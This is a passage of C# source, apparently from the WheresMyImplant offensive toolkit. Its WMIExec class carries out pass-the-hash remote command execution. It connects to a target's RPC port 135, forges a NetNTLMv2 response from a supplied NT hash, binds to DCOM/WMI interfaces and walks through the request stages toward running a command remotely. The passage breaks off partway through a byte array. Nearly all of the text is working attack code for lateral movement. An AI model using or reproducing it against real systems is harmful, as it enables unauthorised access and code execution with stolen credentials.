using System;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace WheresMyImplant
{
    class WMIExec : Base, IDisposable
    {
        private String target;
        private String command;
        private const Int32 SPLIT_INDEX = 5500;
        private Int32 splitIndexTracker = 0;
        private Boolean requestSplit = false;
        private Int32 requestSplitStage = 0;
        private Int32 requestLength;
        private Int32 sequenceNumberCounter;

        private TcpClient wmiClientInitiator;
        private TcpClient wmiClient;
        private TcpClient randomClient;
        private NetworkStream wmiStream;

        private Byte[] recieve;

        private Byte[] bLocalHostname;
        private String strLocalHostname;

        private Byte[] sessionId;
        private Byte[] causalityId;
        private String oxid;
        private Byte[] ipid;
        private Byte[] ipid2;
        private Byte[] uuid = new Byte[0];
        private Byte[] uuid2;

        private Byte[] sequenceNumber = new Byte[] { 0x00, 0x00, 0x00, 0x00 };

        private Byte[] sessionBaseKey;
        private Byte[] signingKey;

        private Byte[] bRemoteHostname;
        private String strRemoteHostname;

        private Byte[] assocGroup;

        private Byte[] processId;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal WMIExec(String command)
        {
            this.command = command;

            Int32 dwProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
            String strProcessId = BitConverter.ToString(BitConverter.GetBytes(dwProcessId)).Replace("-00-00", "");
            processId = strProcessId.Split('-').Select(i => (Byte)Convert.ToInt16(i, 16)).ToArray();

            wmiClientInitiator = new TcpClient();
            wmiClientInitiator.Client.ReceiveTimeout = 30000;

            wmiClient = new TcpClient();
            wmiClient.Client.ReceiveTimeout = 30000;

            recieve = new Byte[2048];
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectInitiator(String target)
        {
            this.target = target;

            Console.WriteLine("Connecting to {0}:135", target);
            try
            {
                wmiClientInitiator.Connect(target, 135);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
            }

            Boolean result = wmiClientInitiator.Connected;
            Console.WriteLine(result);
            if (result)
            {
                wmiStream = wmiClientInitiator.GetStream();
                return true;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void InitiateRPC()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(2);
            rpcBind.SetFragLength(new Byte[] { 0x74, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x02 });
            rpcBind.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            assocGroup = recieve.Skip(20).Take(4).ToArray();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(0, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x05, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            wmiStream.Write(bRPCRequest, 0, bRPCRequest.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            bRemoteHostname = recieve.Skip(42).Take(recieve.Length - 42).ToArray();
            GCHandle handle = GCHandle.Alloc(bRemoteHostname, GCHandleType.Pinned);
            strRemoteHostname = Marshal.PtrToStringUni(handle.AddrOfPinnedObject());
            Console.WriteLine("Target hostname: {0}", strRemoteHostname);
            handle.Free();

            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClientInitiator && wmiClientInitiator.Connected)
            {
                wmiClientInitiator.Close();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectWMI()
        {
            Console.WriteLine("Connecting to {0}:135", target);
            try
            {
                wmiClient.Connect(target, 135);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
                return false;
            }

            if (wmiClient.Connected)
            {
                wmiStream = wmiClient.GetStream();
                return true;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void RPCBind()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(3, new Byte[] { 0x07, 0x82, 0x08, 0xa2 });
            rpcBind.SetFragLength(new Byte[] { 0x78, 0x00 });
            rpcBind.SetAuthLength(new Byte[] { 0x28, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x01 });
            rpcBind.SetContextID(new Byte[] { 0x01, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            assocGroup = recieve.Skip(20).Take(4).ToArray();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] GetNetNTLMv2Response(String domain, String username, String hash)
        {
            assocGroup = recieve.Skip(20).Take(4).ToArray();

            String NTLMSSP = BitConverter.ToString(recieve).Replace("-", "");
            Int32 index = NTLMSSP.IndexOf("4E544C4D53535000") / 2;

            UInt16 wDomain = BitConverter.ToUInt16(recieve.Skip(index + 12).Take(2).ToArray(), 0);
            UInt16 wtarget = BitConverter.ToUInt16(recieve.Skip(index + 40).Take(2).ToArray(), 0);

            sessionId = recieve.Skip(44).Take(8).ToArray();
            Byte[] bServerChallenge = recieve.Skip(index + 24).Take(8).ToArray();
            Int32 start = index + 56 + wDomain;
            Int32 end = index + 55 + wDomain + wtarget;
            Byte[] details = recieve.Skip(start).Take(end - start + 1).ToArray();
            Byte[] bTime = details.Skip(details.Length - 12).Take(8).ToArray();

            Int32 j = 0;
            Byte[] bHash = new Byte[hash.Length / 2];
            for (Int32 i = 0; i < hash.Length; i += 2)
            {
                bHash[j++] = (Byte)((Char)Convert.ToInt16(hash.Substring(i, 2), 16));
            }

            bLocalHostname = Encoding.Unicode.GetBytes(Environment.MachineName);
            Byte[] bLocalHostnameLength = BitConverter.GetBytes(bLocalHostname.Length).Take(2).ToArray();

            Byte[] bDomain = Encoding.Unicode.GetBytes(domain);
            Byte[] domainLength = BitConverter.GetBytes(bDomain.Length).Take(2).ToArray();

            Byte[] bUsername = Encoding.Unicode.GetBytes(username);
            Byte[] usernameLength = BitConverter.GetBytes(bUsername.Length).Take(2).ToArray();

            Byte[] domainOffset = { 0x40, 0x00, 0x00, 0x00 };
            Byte[] usernameOffset = BitConverter.GetBytes(bDomain.Length + 64);
            Byte[] hostnameOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + 64);
            Byte[] lmOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bLocalHostname.Length + 64);
            Byte[] ntOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bLocalHostname.Length + 88);

            String usernameTarget = username.ToUpper();
            Byte[] bUsernameTarget = Encoding.Unicode.GetBytes(usernameTarget);
            bUsernameTarget = Misc.Combine(bUsernameTarget, bDomain);

            Byte[] NetNTLMv2Hash;
            using (HMACMD5 hmac = new HMACMD5())
            {
                hmac.Key = bHash;
                NetNTLMv2Hash = hmac.ComputeHash(bUsernameTarget);
            }

            Byte[] bClientChallenge = new Byte[8];
            Random random = new Random();
            for (Int32 i = 0; i < 8; i++)
            {
                bClientChallenge[i] = (Byte)random.Next(0, 255);
            }

            Byte[] blob = Misc.Combine(new Byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, bTime);
            blob = Misc.Combine(blob, bClientChallenge);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            blob = Misc.Combine(blob, details);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            Byte[] NetNTLMv2Response;
            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = NetNTLMv2Hash;
                Byte[] bServerChallengeAndBlob = Misc.Combine(bServerChallenge, blob);
                NetNTLMv2Response = hmacMD5.ComputeHash(bServerChallengeAndBlob);
                sessionBaseKey = hmacMD5.ComputeHash(NetNTLMv2Response);
            }

            Byte[] signingConstant = { 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x74, 0x6f, 0x20,
                                       0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x2d, 0x74, 0x6f, 0x2d, 0x73, 0x65, 0x72, 0x76,
                                       0x65, 0x72, 0x20, 0x73, 0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x6b, 0x65, 0x79,
                                       0x20, 0x6d, 0x61, 0x67, 0x69, 0x63, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e,
                                       0x74, 0x00 };

            using (MD5 md5 = new MD5CryptoServiceProvider())
            {
                signingKey = md5.ComputeHash(Misc.Combine(sessionBaseKey, signingConstant));
            }

            NetNTLMv2Response = Misc.Combine(NetNTLMv2Response, blob);
            Byte[] NetNTLMv2ResponseLength = BitConverter.GetBytes(NetNTLMv2Response.Length).Take(2).ToArray();

            Byte[] sessionKeyOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bLocalHostname.Length + NetNTLMv2Response.Length + 88);

            Combine combine = new Combine();
            combine.Extend(new Byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00 });
            combine.Extend(new Byte[] { 0x18, 0x00 });
            combine.Extend(new Byte[] { 0x18, 0x00 });
            combine.Extend(lmOffset);

            combine.Extend(NetNTLMv2ResponseLength);
            combine.Extend(NetNTLMv2ResponseLength);
            combine.Extend(ntOffset);

            combine.Extend(domainLength);
            combine.Extend(domainLength);
            combine.Extend(domainOffset);

            combine.Extend(usernameLength);
            combine.Extend(usernameLength);
            combine.Extend(usernameOffset);

            combine.Extend(bLocalHostnameLength);
            combine.Extend(bLocalHostnameLength);
            combine.Extend(hostnameOffset);

            combine.Extend(new Byte[] { 0x00, 0x00 });
            combine.Extend(new Byte[] { 0x00, 0x00 });
            combine.Extend(sessionKeyOffset);

            combine.Extend(new Byte[] { 0x15, 0x82, 0x88, 0xa2 });
            combine.Extend(bDomain);
            combine.Extend(bUsername);
            combine.Extend(bLocalHostname);
            combine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            combine.Extend(NetNTLMv2Response);
            return combine.Retrieve();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Authenticate(String domain, String username, String hash)
        {
            Byte[] NetNTLMv2Response = GetNetNTLMv2Response(domain, username, hash);

            DCERPCAUTH3 rpcAUTH3 = new DCERPCAUTH3();
            rpcAUTH3.SetNTLMSSP(NetNTLMv2Response);
            Byte[] bRPCAUTH3 = rpcAUTH3.GetRequest();

            wmiStream.Write(bRPCAUTH3, 0, bRPCAUTH3.Length);
            wmiStream.Flush();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean Activator()
        {
            causalityId = Encoding.ASCII.GetBytes(Misc.GenerateUuid(16));

            DCOMRemoteCreateInstance remoteCreateInstance = new DCOMRemoteCreateInstance();
            remoteCreateInstance.SetDCOMCausalityID(causalityId);
            remoteCreateInstance.SetServerInfoName(strRemoteHostname);
            Byte[] bRemoteCreateInstance = remoteCreateInstance.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bRemoteCreateInstance.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x03, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x01, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x04, 0x00 });

            Byte[] bData = Misc.Combine(rpcRequest.GetRequest(), bRemoteCreateInstance);
            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClient && wmiClient.Connected)
            {
                wmiClient.Close();
            }

            if (recieve.Skip(2).Take(1).ToArray().SequenceEqual(new Byte[] { 0x02 }))
            {
                Console.WriteLine("WMI Access");
                return true;
            }
            else
            {
                Console.WriteLine(BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectRandom()
        {
            Byte[] bTargetUnicode = Misc.Combine(new Byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(strRemoteHostname + "["));
            String search = BitConverter.ToString(bTargetUnicode).Replace("-", "");
            String strRecieve = BitConverter.ToString(recieve).Replace("-", "");
            Int32 indexStart = strRecieve.IndexOf(search) / 2;

            indexStart = Array.IndexOf(recieve, (Byte)0x5b, indexStart) + 2;
            Int32 indexEnd = Array.IndexOf(recieve, (Byte)0x5d, indexStart);
            Byte[] bPort = new Byte[indexEnd - indexStart];
            Array.Copy(recieve, indexStart, bPort, 0, indexEnd - indexStart);
            Int32.TryParse(Encoding.Unicode.GetString(bPort), out Int32 port);
            Console.WriteLine(port);

            String MEOW = BitConverter.ToString(recieve).Replace("-", "");
            Int32 meowIndex = MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820") / 2;

            oxid = BitConverter.ToString(recieve.Skip(meowIndex + 32).Take(8).ToArray()).Replace("-", "");
            ipid = recieve.Skip(meowIndex + 48).Take(16).ToArray();

            Int32 oxidIndex2 = MEOW.IndexOf(oxid, MEOW.IndexOf(oxid) + 1) / 2;
            uuid = recieve.Skip(oxidIndex2 + 12).Take(16).ToArray();

            Console.WriteLine("Connecting to {0}:{1}", target, port);
            randomClient = new TcpClient();
            randomClient.Client.ReceiveTimeout = 30000;
            try
            {
                randomClient.Connect(target, port);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
                return false;
            }

            if (randomClient.Connected)
            {
                wmiStream = randomClient.GetStream();
                return true;
            }
            else
            {
                return false;
            }           
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void RPCBindRandom()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(2, new Byte[] { 0x04 }, new Byte[] { 0x97, 0x82, 0x08, 0xa2 });
            rpcBind.SetFragLength(new Byte[] { 0xd0, 0x00 });
            rpcBind.SetAuthLength(new Byte[] { 0x28, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x03 }, new Byte[] { 0x97, 0x82, 0x08, 0xa2 });
            rpcBind.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void AuthenticateRandom(String domain, String username, String hash)
        {
            Byte[] NetNTLMv2Response = GetNetNTLMv2Response(domain, username, hash);

            DCERPCAUTH3 rpcAUTH3 = new DCERPCAUTH3();
            rpcAUTH3.SetNTLMSSP(NetNTLMv2Response);
            rpcAUTH3.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcAUTH3.SetAuthLevel(new Byte[] { 0x04 });
            Byte[] bRPCAUTH3 = rpcAUTH3.GetRequest();

            wmiStream.Write(bRPCAUTH3, 0, bRPCAUTH3.Length);
            wmiStream.Flush();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void QueryInterface()
        {
            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x83 });
            rpcRequest.SetData(uuid);
            rpcRequest.SetFragLength(76, 16, 4);
            rpcRequest.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x03, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            DCOMRemQueryInterface remQueryInterface = new DCOMRemQueryInterface();
            remQueryInterface.SetCausalityID(causalityId);
            remQueryInterface.SetIPID(ipid);
            remQueryInterface.SetIID(new Byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
            Byte[] bRemQueryInterface = remQueryInterface.GetRequest();

            NTLMSSPVerifier verifier = new NTLMSSPVerifier();
            verifier.SetAuthPadLen(4);
            verifier.SetAuthLevel(new Byte[] { 0x04 });
            verifier.SetNTLMSSPVerifierSequenceNumber(sequenceNumber);
            Byte[] bVerifier = verifier.GetRequest();

            Byte[] rpcSignature;
            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = signingKey;
                Combine hmacCombine = new Combine();
                hmacCombine.Extend(sequenceNumber);
                hmacCombine.Extend(bRPCRequest);
                hmacCombine.Extend(bRemQueryInterface);
                hmacCombine.Extend(bVerifier.Take(12).ToArray());

                rpcSignature = hmacMD5.ComputeHash(hmacCombine.Retrieve());
            }
            verifier.SetNTLMSSPVerifierChecksum(rpcSignature.Take(8).ToArray());
            bVerifier = verifier.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bRPCRequest);
            combine.Extend(bRemQueryInterface);
            combine.Extend(bVerifier);
            Byte[] bData = combine.Retrieve();

            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            String strRecieve = BitConverter.ToString(recieve).Replace("-", "");
            Int32 oxidIndex = strRecieve.IndexOf(oxid) / 2;
            uuid2 = recieve.Skip(oxidIndex + 16).Take(16).ToArray();

            AlterContext();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void AlterContext()
        {
            Byte[] callID = new Byte[0];
            Byte[] contextID = new Byte[0];
            Byte[] contextUUID = new Byte[0];

            if(sequenceNumber.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x03, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x02, 0x00 };
                contextUUID = new Byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x01, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x04, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x03, 0x00 };
                contextUUID = new Byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x06, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x09, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x04, 0x00 };
                contextUUID = new Byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
            }

            DCERPCAlterContext alterContext = new DCERPCAlterContext();
            alterContext.SetAssocGroup(assocGroup);
            alterContext.SetCallID(callID);
            alterContext.SetContextID(contextID);
            alterContext.SetInterface(contextUUID);
            Byte[] bData = alterContext.GetRequest();

            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            Request();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Request()
        {
            String stage;

            Byte[] flags = new Byte[0];
            Int32 authPadding = 0;
            Byte[] callID = new Byte[0];
            Byte[] contextID = new Byte[0];
            Byte[] opnum = new Byte[0];
            Byte[] requestUUID = new Byte[0];
            Byte[] stubData;

            Console.WriteLine("Sequence Number: {0}", BitConverter.ToString(sequenceNumber));
            if (sequenceNumber.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x01, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 12;
                callID = new Byte[] { 0x03, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x02, 0x00 };
                opnum = new Byte[] { 0x03, 0x00 };
                requestUUID = uuid2;
                Byte[] hostnameLength = BitConverter.GetBytes(Environment.MachineName.Length + 1);

                if (0 == Environment.MachineName.Length % 2)
                    bLocalHostname = Misc.Combine(bLocalHostname, new Byte[] { 0x00, 0x00 });
                else
                    bLocalHostname = Misc.Combine(bLocalHostname, new Byte[] { 0x00, 0x00 });


                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                stubCombine.Extend(hostnameLength);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(hostnameLength);
                stubCombine.Extend(bLocalHostname);
                stubCombine.Extend(processId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubData = stubCombine.Retrieve();

                stage = "AlterContext";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x01, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x02, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 8;
                callID = new Byte[] { 0x04, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x03, 0x00 };
                opnum = new Byte[] { 0x03, 0x00 };
                requestUUID = ipid;

                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubData = stubCombine.Retrieve();

                stage = "Request";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x02, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x03, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 0;
                callID = new Byte[] { 0x05, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x03, 0x00 };
                opnum = new Byte[] { 0x06, 0x00 };
                requestUUID = ipid;

                Byte[] namespaceLength = BitConverter.GetBytes(strRemoteHostname.Length + 14);
                Byte[] bWMINamespace = Encoding.Unicode.GetBytes(String.Format(@"\\{0}\root\cimv2", strRemoteHostname));

                if (0 == strRemoteHostname.Length % 2)
                    bWMINamespace = Misc.Combine(bWMINamespace, new Byte[] { 0x00, 0x00 });
                else
                    bWMINamespace = Misc.Combine(bWMINamespace, new Byte[] { 0x00, 0x00 });

                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                stubCombine.Extend(namespaceLength);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(namespaceLength);
                stubCombine.Extend(bWMINamespace);
                stubCombine.Extend(new Byte[] {
                    0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09,
                    0x00, 0x00, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x2d, 0x00, 0x55, 0x00, 0x53, 0x00,
                    0x2c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00});
                stubData = stubCombine.Retrieve();

                stage = "Request";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x03, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x04, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 8;
                callID = new Byte[] { 0x06, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x00, 0x00 };
                opnum = new Byte[] { 0x05, 0x00 };
                requestUUID = uuid;

                String strRecieve = BitConverter.ToString(recieve).Replace("-", "");
                Int32 oxidIndex = strRecieve.IndexOf(oxid) / 2;
                ipid2 = recieve.Skip(oxidIndex + 16).Take(16).ToArray();
                DCOMRemRelease remRelease = new DCOMRemRelease();
                remRelease.SetCausalityID(causalityId);
                remRelease.SetIPID(uuid2);
                remRelease.SetIPID2(ipid);
                stubData = remRelease.GetRequest();

                stage = "Request";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x04, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x05, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 4;
                callID = new Byte[] { 0x07, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x00, 0x00 };
                opnum = new Byte[] { 0x03, 0x00 };
                requestUUID = uuid;

                DCOMRemQueryInterface remQueryInterface = new DCOMRemQueryInterface();
                remQueryInterface.SetCausalityID(causalityId);
                remQueryInterface.SetIPID(ipid2);
                remQueryInterface.SetIID(new Byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                stubData = remQueryInterface.GetRequest();

                stage = "Request";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x05, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x06, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 4;
                callID = new Byte[] { 0x08, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x00, 0x00 };
                opnum = new Byte[] { 0x03, 0x00 };
                requestUUID = uuid;

                DCOMRemQueryInterface remQueryInterface = new DCOMRemQueryInterface();
                remQueryInterface.SetCausalityID(causalityId);
                remQueryInterface.SetIPID(ipid2);
                remQueryInterface.SetIID(new Byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                stubData = remQueryInterface.GetRequest();

                stage = "AlterContext";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x06, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x07, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 0;
                callID = new Byte[] { 0x09, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x04, 0x00 };
                opnum = new Byte[] { 0x06, 0x00 };
                requestUUID = ipid2;

                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a,
                                                0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00,
